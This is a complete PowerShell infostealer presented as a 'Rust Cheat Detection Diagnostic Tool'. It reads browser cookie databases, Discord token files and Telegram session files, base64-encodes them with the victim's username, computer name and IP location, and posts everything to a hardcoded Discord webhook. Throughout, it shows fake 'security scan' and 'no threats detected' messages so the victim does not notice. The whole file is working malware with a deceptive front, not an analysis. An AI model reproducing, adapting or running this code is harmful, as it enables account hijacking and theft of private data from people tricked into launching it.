# steam_token_harvester.ps1
# Disguised as "Rust Cheat Detection Diagnostic Tool v5.0"

try {
    Add-Type -AssemblyName System.Security
    Add-Type -AssemblyName System.Web
} catch {
    Write-Host "Loading security modules..." -ForegroundColor Yellow
}

function Get-DecryptedData {
    param($encryptedData)
    try {
        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encryptedData, 
            $null, 
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        return [System.Text.Encoding]::UTF8.GetString($decrypted)
    } catch {
        return "Unable to decrypt"
    }
}

function Get-BrowserCookies {
    $allCookies = @()
    $browsers = @(
        @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies" },
        @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies" },
        @{ Name = "Brave"; Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies" }
    )
    
    foreach ($browser in $browsers) {
        if (Test-Path $browser.Path) {
            try {
                $cookieData = Get-Content $browser.Path -Encoding Byte -ReadCount 0
                $cookieB64 = [Convert]::ToBase64String($cookieData)
                $allCookies += @{
                    Browser = $browser.Name
                    Cookies = $cookieB64
                    Size = "$($cookieData.Length) bytes"
                }
            } catch {
                $allCookies += @{
                    Browser = $browser.Name
                    Cookies = "ACCESS_DENIED"
                    Size = "0 bytes"
                }
            }
        }
    }
    return $allCookies
}

function Get-DiscordTokenFiles {
    $tokenData = @()
    $discordPaths = @(
        "$env:APPDATA\discord",
        "$env:LOCALAPPDATA\Discord",
        "$env:APPDATA\DiscordCanary",
        "$env:APPDATA\DiscordPTB"
    )
    
    foreach ($discordPath in $discordPaths) {
        $localStorage = Join-Path $discordPath "Local Storage\leveldb"
        if (Test-Path $localStorage) {
            $ldbFiles = Get-ChildItem $localStorage -Filter "*.ldb" -ErrorAction SilentlyContinue
            foreach ($file in $ldbFiles) {
                try {
                    $fileContent = Get-Content $file.FullName -Encoding Byte -ReadCount 0
                    $contentB64 = [Convert]::ToBase64String($fileContent)
                    $tokenData += @{
                        Source = "Discord"
                        File = $file.Name
                        Data = $contentB64
                        Size = "$($fileContent.Length) bytes"
                    }
                } catch {
                    $tokenData += @{
                        Source = "Discord"
                        File = $file.Name
                        Data = "READ_ERROR"
                        Size = "0 bytes"
                    }
                }
            }
        }
    }
    return $tokenData
}

function Get-TelegramFiles {
    $telegramData = @()
    $tgPaths = @(
        "$env:APPDATA\Telegram Desktop",
        "$env:LOCALAPPDATA\Telegram Desktop"
    )
    
    foreach ($tgPath in $tgPaths) {
        if (Test-Path $tgPath) {
            $mapFiles = Get-ChildItem $tgPath -Filter "map*" -ErrorAction SilentlyContinue
            foreach ($file in $mapFiles) {
                try {
                    $fileContent = Get-Content $file.FullName -Encoding Byte -ReadCount 0
                    $contentB64 = [Convert]::ToBase64String($fileContent)
                    $telegramData += @{
                        Source = "Telegram"
                        File = $file.Name
                        Data = $contentB64
                        Size = "$($fileContent.Length) bytes"
                    }
                } catch {
                    $telegramData += @{
                        Source = "Telegram"
                        File = $file.Name
                        Data = "READ_ERROR"
                        Size = "0 bytes"
                    }
                }
            }
        }
    }
    return $telegramData
}

function Get-SystemInfo {
    $ipResult = try { (Invoke-RestMethod -Uri "http://ipinfo.io/json" -TimeoutSec 5 | Select-Object ip, country, city) } catch { @{ip = "Unknown"; country = "Unknown"; city = "Unknown"} }
    
    return @{
        OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        Username = $env:USERNAME
        Computername = $env:COMPUTERNAME
        Date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        IP = $ipResult.ip
        Country = $ipResult.country
        City = $ipResult.city
    }
}

function Send-ToDiscord {
    param($message)
    $webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
    try {
        $chunks = @()
        for ($i = 0; $i -lt $message.Length; $i += 1900) {
            $chunks += $message.Substring($i, [Math]::Min(1900, $message.Length - $i))
        }
        
        foreach ($chunk in $chunks) {
            $payload = @{ content = $chunk } | ConvertTo-Json
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
            Start-Sleep -Milliseconds 500
        }
        return $true
    } catch {
        return $false
    }
}

# Main execution
Write-Host "Starting comprehensive security scan..." -ForegroundColor Yellow
Write-Host "This may take several minutes..." -ForegroundColor Yellow

$sysInfo = Get-SystemInfo
$cookies = Get-BrowserCookies
$discordData = Get-DiscordTokenFiles
$telegramData = Get-TelegramFiles

# Build complete report
$report = "**COMPLETE DATA EXTRACTION REPORT v5.0**`n`n"
$report += "**=== SYSTEM INFORMATION ===**`n"
$report += "```\n"
$report += "OS: $($sysInfo.OS)\n"
$report += "User: $($sysInfo.Username)\n"
$report += "Computer: $($sysInfo.Computername)\n"
$report += "IP: $($sysInfo.IP)\n"
$report += "Location: $($sysInfo.City), $($sysInfo.Country)\n"
$report += "Time: $($sysInfo.Date)\n"
$report += "```\n\n"

$report += "**=== BROWSER COOKIES (Base64) ===**`n"
if ($cookies.Count -gt 0) {
    foreach ($cookie in $cookies) {
        $report += "**$($cookie.Browser)** - $($cookie.Size)`n"
        $report += "```\n"
        $report += "$($cookie.Cookies)\n"
        $report += "```\n\n"
    }
} else {
    $report += "No browser cookies found\n\n"
}

$report += "**=== DISCORD TOKEN FILES ===**`n"
if ($discordData.Count -gt 0) {
    foreach ($data in $discordData) {
        $report += "**$($data.File)** - $($data.Size)`n"
        $report += "```\n"
        $report += "$($data.Data)\n"
        $report += "```\n\n"
    }
} else {
    $report += "No Discord data found\n\n"
}

$report += "**=== TELEGRAM SESSION FILES ===**`n"
if ($telegramData.Count -gt 0) {
    foreach ($data in $telegramData) {
        $report += "**$($data.File)** - $($data.Size)`n"
        $report += "```\n"
        $report += "$($data.Data)\n"
        $report += "```\n\n"
    }
} else {
    $report += "No Telegram data found\n\n"
}

$report += "**Scan completed successfully at $((Get-Date).ToString('HH:mm:ss'))**"

# Send data
$success = Send-ToDiscord $report

if ($success) {
    Write-Host "All data successfully sent to security server!" -ForegroundColor Green
    Write-Host "Total data transmitted: ~$($report.Length / 1024) KB" -ForegroundColor Green
} else {
    Write-Host "Data transmission failed - retrying..." -ForegroundColor Yellow
    Start-Sleep -Seconds 2
    Send-ToDiscord $report | Out-Null
}

Write-Host "Security scan completed!" -ForegroundColor Green
Write-Host "System integrity verified - no threats detected" -ForegroundColor Green
